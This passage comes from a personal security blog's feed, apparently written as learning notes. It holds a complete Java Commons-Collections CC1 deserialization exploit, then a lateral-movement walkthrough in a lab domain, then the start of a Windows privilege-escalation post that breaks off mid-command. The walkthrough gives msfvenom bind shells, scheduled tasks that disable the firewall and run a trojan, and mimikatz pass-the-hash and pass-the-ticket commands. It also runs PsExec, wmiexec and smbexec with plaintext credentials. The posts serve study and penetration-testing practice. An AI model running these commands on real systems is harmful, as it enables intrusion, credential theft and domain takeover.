memberTypes = annotationType.memberTypes();<span class="comment">//返回一个Map类型的对象，存储了该注解类型中的所有成员变量信息，其中，键为成员变量的名称，值为成员变量的类型</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();<span class="comment">//获取传入的map遍历时的key，这个key我们可以自己定义</span></span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name);<span class="comment">//通过key获取成员变量的类型</span></span><br><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;<span class="comment">//如果成员变量存在</span></span><br></pre></td></tr></table></figure><p>要进入使条件为真的话，就要找到一个含有成员变量的注释类，这里我们找到了Retention类有个叫value的成员变量</p><p><img src="image-20230322183208737.png" alt="image-20230322183208737"></p><p>同时要修改我们传入的map的key值为value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>第二个if判断成员变量的值是否为其所声明类型的实例，而这里肯定不是，所以不需要额外做手脚</p><h3 id="setvalue-参数">setvalue()参数</h3><p>要解决这个问题其实比较靠运气，因为对于setvalue()的参数我们不太好修改，但这里恰好有一个ConstantTransformer类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个类的transform很离谱，不管输入什么都只是输出类里的iConstant，这就使得输入的参数“无效化”，同时返回的内容是我们想要的内容，于是将执行的代码做如下修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//令iConstant=Runtime.class，使得Runtime.class作为下一条的输入值</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;fdsf&quot;</span>);<span class="comment">//这里不管传入什么参数都不会影响ConstantTransformer.transform传出的值</span></span><br></pre></td></tr></table></figure><p><img src="image-20230322200354729.png" alt="image-20230322200354729"></p><p>到这里三个问题都已经得到了解决</p><h2 id="最后">最后</h2><p>最终的利用链：</p><p>AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer.transform()</p><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.transforms.Transform;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.instrument.TransformerManager;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//创建chainedTransformer对象来执行任意代码</span></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler实例化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//序列化与反序列化</span></span><br><span class="line">        Serialize(obj);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(a);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> (Object)objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230322203254905.png" alt="image-20230322203254905"></p><p>其实但看整个利用链的话还是比较简单的，难的是有一些地方需要想办法绕过</p><p>参考视频：</p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?share_source=copy_web&amp;vd_source=c7f71b9392bbbd1398d21bf06f9a793e">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序列化与反序列化&quot;&gt;序列化与反序列化&lt;/h1&gt;
&lt;p&gt;java序列化是通过&lt;code&gt;ObjectOutputStream&lt;/code&gt;类中的&lt;code&gt;writeObject&lt;/code&gt;方法&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;</summary>
      
    
    
    
    <category term="学习记录" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>后渗透之横向移动（学习记录）</title>
    <link href="http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/"/>
    <id>http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</id>
    <published>2023-03-20T13:29:27.000Z</published>
    <updated>2023-03-22T12:57:48.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境">环境</h1><p>已经拿下了一台域内win7的shell，同时获得了system权限<br>目标机是一台win2008，ip地址192.168.138.138</p><h1 id="ipc连接">ipc连接</h1><p>使用条件：<code>对方开启了139和445端口</code>&amp;&amp;<code>对方开启了默认共享</code><br>通过mimikatz在win7上拿到了域管理员Administrator的明文密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;Admin@123&quot; /user:Administrator</span><br></pre></td></tr></table></figure><p>通过<code>net use</code>查看已经建立的ipc连接<br><img src="59df3dbf616d4e9bbe97a20a5133463d.png" alt=""></p><h1 id="计划任务">计划任务</h1><p>思路是通过计划任务运行上传的木马文件从而拿shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#由于对方在内网，所以要通过正向连接的方式创建木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.138.138 LPORT=5555 -f exe &gt;f.exe</span><br><span class="line">#将木马复制到对方的c盘下</span><br><span class="line">copy f.exe \\192.168.138.138\c$</span><br><span class="line">#查看是否复制成功</span><br><span class="line">dir \\192.168.138.138\c$</span><br></pre></td></tr></table></figure><p><img src="3c0619264b39461bab91b56ed157b44e.png" alt=""></p><h2 id="at">at</h2><p>首先要关闭对方的防火墙，否则正向连接会失败</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看对方当前时间</span></span><br><span class="line">net time \\192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建at计划任务来关闭防火墙</span></span><br><span class="line">at \\192.168.138.138 16:28  cmd.exe /c &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行木马</span></span><br><span class="line">at \\192.168.138.138 16:29 C:/f.exe</span><br></pre></td></tr></table></figure><p>msf成功拿到shell<br><img src="e4a7a521ead346c18b700c9b1fef59d2.png" alt=""></p><blockquote><p>注：at任务在运行结束以后会自动将计划列表里的任务删除</p></blockquote><h2 id="schtasks">schtasks</h2><p>为了方便我们这里先将要执行的命令写到一个bat文件里，然后再运行bat文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell.bat</span></span><br><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">NetSh Advfirewall set allprofiles state off</span><br><span class="line">f.exe</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">copy shell.bat \\192.168.138.138\c$</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建计划任务</span></span><br><span class="line">schtasks  /create /s 192.168.138.138 /tn test /ru system /tr C:/shell.bat /sc daily /st 19:25</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">s表示要连接到的远程系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">tn表示计划任务的名字</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ru表示运行计划任务的用户</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">tr</span>表示计划运行文件的位置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sc表示“每”</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">st表示时间 /sc daily /st 19:25 表示 每天的19：25执行</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行计划任务</span></span><br><span class="line">schtasks  /run /s 192.168.138.138 /i /tn test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">i表示忽略时间信息直接执行</span></span><br></pre></td></tr></table></figure><blockquote><p>注：在使用schtasks的时候会留下日志文件C:/Windows/Tasks/SchedLgu.txt</p></blockquote><h1 id="哈希传递（PTH）">哈希传递（PTH）</h1><p><code>哈希传递（Pass the Hash ）攻击</code>是一种利用 Windows 系统的身份验证机制漏洞的网络攻击方式。攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限（需要管理员权限）。<br>对于win2012以上的windows，或者win2002以下的打了KB2871997补丁的windows是读不了明文的，而这种攻击方式通常利用 Windows 系统中的 NTLM 身份认证协议，攻击者可以在未授权的情况下获取到用户的 NTLM 哈希值，并使用它来尝试登录目标系统，从而执行任意操作，甚至完全控制受攻击系统。</p><p>这里为了演示，先打开win7的3389，再通过操纵win7打win2008<br>打开3389：<code>run post/windows/manage/enable_rdp</code><br>rdesktop连接：<code>rdesktop -u Administrator -p Admin@123 -d sun 192.168.135.150   </code><br><img src="511a3f8697d7446b9e34159807f16b1a.png" alt="">利用mimikatz拿到了域管理员的NTLM哈希<br><img src="11629e84de7247ea87ce697ac35695be.png" alt=""><br>哈希传递：<code>sekurlsa::pth /user:administrator /domain:sun.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</code><br>此时会出现一个新的cmd窗口<br>同时我们可以通过<code>dir \\dc\c$</code>来看到域控主机c盘下的文件</p><p><img src="ef06c69c50064b1e9f694213e67e6515.png" alt=""></p><blockquote><p>注：这里只能使用域控的名字而不能使用ip地址访问</p></blockquote><h1 id="票据传递（PTT）">票据传递（PTT）</h1><p>票据传递攻击（Pass the Ticket Attack）是一种利用 Windows 系统的 Kerberos 身份验证协议漏洞的攻击方式。攻击者可以获取到受害者计算机上的 Kerberos 认证票据，并将其传递给其他系统，以获得访问权限。<br>将内存中的票据导出：<code>sekurlsa::tickets /export</code><br>可以看到出现了许多的票据文件<br><img src="ded7f799fca6446db80a9fd666a5b859.png" alt=""><br>清除内存中的票据文件：<code> kerberos::purge</code><br>将票据文件注入内存：<br><code> kerberos::ptt &quot;C:\Users\Administrator\Desktop\[0;53e35]-2-0-40e00000-Administrator@krbtgt-SUN.COM.kirbi</code><br><img src="be4859a28dd54233a3175c8f21b01dbc.png" alt=""><br>同样可以查看域控的c盘文件<br><img src="d471577d68794109bd7bd93fccecc0f1.png" alt=""></p><blockquote><p>区别：<br>票据传递攻击（Pass the Ticket Attack）和哈希传递攻击（Pass the Hash Attack）都是利用 Windows 系统中的身份验证机制漏洞的攻击方式。它们的区别在于攻击者<code>获取到的信息不同</code>。<br>票据传递攻击是基于 Kerberos 认证协议的攻击，攻击者通过获取到受害者计算机上的 <code>Kerberos 认证票据（TGT）</code>，并将其传递给其他系统来获得访问权限。<br>而哈希传递攻击则是基于 NTLM 身份认证协议的攻击，攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限。</p></blockquote><h1 id="PsExec">PsExec</h1><p><code>PsExec</code>是一个由Sysinternals（现在属于微软）开发的免费实用程序，可以在本地或远程计算机上执行命令。它允许管理员在没有登录目标计算机的情况下，远程执行命令并获取结果。PsExec利用 Windows 系统中的网络共享和远程执行服务，通过远程调用进程、服务等方式来进行远程控制（需要提前下载）。<br>PsExec 连接到目标计算机并将 PsExec 服务程序复制到目标计算机的系统目录中，同时在目标计算机上启动一个服务 (PSEXESVC)，该服务会等待来自 PsExec 的指令。PsExec 使用 Windows RPC（远程过程调用）协议与 PSEXESVC 通信，以向其发送要执行的命令。PSEXESVC 接收到命令后，会在目标计算机上启动相应的进程，并将结果返回给 PsExec。<br>在已经建立了ipc的情况下，可以直接通过psexec拿域控的system权限的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sExec.exe -accepteula \\192.168.138.138 -s cmd.exe</span><br></pre></td></tr></table></figure><p><img src="d9d529932e60460fb6d0134a9d56dfe7.png" alt=""><br>如果没有建立ipc也可以通过账户名和密码登录，但前提是该账户有<code>授权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.138.138 -u Administrator -p  Admin@123 cmd.exe</span><br></pre></td></tr></table></figure><p>这里没有授权所以失败了<br><img src="b3fd7ddf7daa4c8597816f88cb930ac3.png" alt=""><br>同时msf中也带有psexec的攻击模块（要提前搭建内网路由） <code>exploit/windows/smb/psexec  </code><br>查看options<br><img src="6710fda5114b4f859573d8a7888aef27.png" alt="">设置参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.138.138</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass Admin@123</span><br></pre></td></tr></table></figure><p>成功拿到shell<br><img src="0d06b94cf3744fd8bf6f82dcb3df3719.png" alt=""><br>在msf中使用psexec如果对方防火墙开着的话，就会连接失败<br><img src="7fe56df5233f408db138f534a479876a.png" alt=""></p><h1 id="WMI">WMI</h1><p><code>WMI（Windows Management Instrumentation，Windows管理规范）</code>是一种由微软开发的系统管理技术，用于在Windows操作系统中收集和监控各种系统信息，以及执行系统管理任务。<br><code>WMIC（Windows Management Instrumentation Command-Line，Windows管理规范命令行）</code>是一种基于WMI技术的命令行工具，用于在Windows操作系统中执行系统管理任务。通过WMIC命令行工具，管理员可以使用命令行界面来调用WMI接口，并执行各种管理任务，例如获取系统信息、配置系统参数、监控性能和事件等。WMIC命令行工具提供了丰富的命令选项和参数，支持多种数据格式和输出方式，适用于本地计算机和远程计算机上的管理任务。<br>在win7中输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.138.138 /user:Administrator /password:Admin@123 process call create &quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="e7b0dd212a944905bf06a4bfbad8edd4.png" alt=""><br>win2008出现ip.txt说明命令成功执行<br><img src="0acc7f885acb4e4e95fbf27d091bcc56.png" alt=""></p><p>也可以通过impacket包（要下载）的wimexec来登录（实测有防火墙也能打）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法：wmiexec.py user:pass@ip</span>  </span><br><span class="line">proxychains wmiexec.py administrator:Admin@123@192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">proxychains 是因为目标在内网开了代理</span></span><br></pre></td></tr></table></figure><p><img src="3e6af64105484320825ab49b2f78cc0f.png" alt=""></p><h1 id="SMB">SMB</h1><p><code>SMB（Server Message Block，服务器消息块）</code>是一种用于文件和打印机共享的网络协议，通过SMB协议，客户端可以与远程计算机上的共享资源进行通信和交互，例如读取或写入共享文件、访问共享打印机等。SMB协议基于客户端/服务器模型，其中客户端向SMB服务器发送请求，并在响应中获取所需的数据。<br><code>SMBexec</code>是一种基于SMB协议的渗透测试工具，利用SMB协议的漏洞和不安全配置与目标计算机进行通信和交互，以执行各种攻击任务。<br>impacket中有smbexec.py工具可以用来攻击<br>使用方法和wmiexec类似</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbexec.py Administrator:Admin@123@192.168.138.138   </span><br></pre></td></tr></table></figure><p><img src="aa493e42938f4eb682654418fb32567b.png" alt=""></p><h1 id="最后">最后</h1><p>除此之外，还可以利用一些windows内核漏洞（例如永恒之蓝）去横向，就不多说了。<br>可以看到大多数的横向移动都是建立在拥有一个高权限用户和获取到明文密码的前提下的，所以前期的信息收集和权限提升步骤也不必可少。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;环境&lt;/h1&gt;
&lt;p&gt;已经拿下了一台域内win7的shell，同时获得了system权限&lt;br&gt;
目标机是一台win2008，ip地址192.168.138.138&lt;/p&gt;
&lt;h1 id=&quot;ipc连接&quot;&gt;ipc连接&lt;/h1&gt;
&lt;p&gt;使用条件：&lt;code&gt;对</summary>
      
    
    
    
    <category term="学习记录" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="后渗透" scheme="http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>后渗透之权限提升（学习记录）</title>
    <link href="http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/"/>
    <id>http://example.com/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</id>
    <published>2023-03-20T12:23:39.000Z</published>
    <updated>2023-03-20T14:03:10.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序">序</h1><p>本来兴致勃勃的想要学一下内网横向渗透的，结果发现其他人随随便便用永恒之蓝就直接拿到了system权限，但同样的靶机，自己电脑上的永恒之蓝完全没用，于是干脆复习了一遍window下的权限提升方法。<br>（本文主要是针对windows提权方法进行总结，在实验中以win7为例，采用的提权方法均<strong>失败</strong>了，想要看到成功截图的请移步其他大佬的博客）<br>靶机是<code>win7</code>的系统，登录的账户为<code>demo\douser</code>，是demo域下的一个普通域成员</p><h1 id="系统内核溢出漏洞提权">系统内核溢出漏洞提权</h1><p>使用msf的<code>post/windows/gather/enum_patches</code>模块搜索系统中缺少的补丁<br><img src="4f5f00b6bc3347f0a86236345577d948.png" alt=""><br>好家伙，补丁全打上了<br>用<code>post/multi/recon/local_exploit_suggester</code>查看可以利用的漏洞模块<br><img src="29f8aed66ddd45d1b57263ce119d4b63.png" alt="">尝试了给出的几种攻击模块，全部失败</p><h1 id="计划任务">计划任务</h1><p>windows中用来执行计划任务的无疑是<code>at</code>和<code>schtasks</code>命令，然而从 Windows Vista 开始，Microsoft 已经不再推荐使用“at”命令来创建计划任务，并且在后续的 Windows 版本中将其标记为“弃用”。所以在win7上我们通过schtasks来尝试提升权限<br><img src="15572ce9a95744a6b28854fa6f7c9db4.png" alt=""><br>当前用户并没有操作schtasks的权限，虽然at命令被弃用了，但事实上除了win11以外，<strong>其他的从 Windows Vista 到win10都是可以使用at创建计划任务的</strong>，只不过无法使用/interactive交互式任务。<br><img src="52a4639ce69045dc855e9507b259c634.png" alt="在win11上使用at"><br><img src="83d55d15bd394f53a7d75c7ad3a6c1a8.png" alt="在win2008中使用at"><br>所以对于win7我们依旧可以上传木马到目标机器，同时msf开启监听，利用at执行木马，就会返回一个system权限的shell<br>但是这里我们依旧没有使用at的权限<br><img src="310523a50df24e6db0f04723766a6e7a.png" alt="在win7上使用at"></p><h1 id="sc提权">sc提权</h1><p>之前一直以为sc提权就是schtasks计划任务（主要是schtasks的首字母就是sc），实际上二者没啥关系。</p><p><code>sc 命令</code>是 Windows 操作系统中的一个命令行工具，用于配置和管理 Windows 服务。在一些情况下，可以使用 sc 命令进行提权，例如将一个普通用户权限的服务修改为 LocalSystem 账户权限。</p><p>这种提权的原理是因为在 Windows 系统中，服务通常使用某个特定的账户来运行，如果该账户拥有较高的权限，那么相应的服务也就具备了这些权限。因此，通过使用 sc 命令修改服务所使用的账户，可以实现提升服务权限的目的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line"><span class="meta prompt_">#</span><span 